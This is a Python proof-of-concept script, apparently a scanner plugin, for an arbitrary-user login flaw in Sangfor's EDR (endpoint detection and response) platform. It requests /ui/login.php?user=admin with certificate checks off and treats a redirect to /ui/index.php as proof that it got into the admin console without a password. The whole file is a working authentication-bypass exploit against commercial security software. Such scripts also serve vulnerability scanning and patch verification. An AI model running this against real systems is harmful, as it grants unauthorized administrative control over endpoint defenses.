import requests
from urllib.parse import urlparse
requests.packages.urllib3.disable_warnings()

name = '深信服终端监测响应平台(EDR)任意用户登录漏洞'


def run(url):
    headers = {
        'Content-Type': 'text/xml',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0',
    }
    host = urlparse(url)
    vulurl = f"{host.scheme}://{host.netloc}/ui/login.php?user=admin"
    try:
        response = requests.get(vulurl, headers=headers, timeout=15, verify=False)
        if '/ui/index.php' in response.url:
            return ['True', name, vulurl]
        else:
            return ['False', name]
    except Exception as e:
        return ['False', name]


if __name__ == '__main__':
    url = 'https://192.168.204.131/ui/index.php#/index'
    print(run(url))
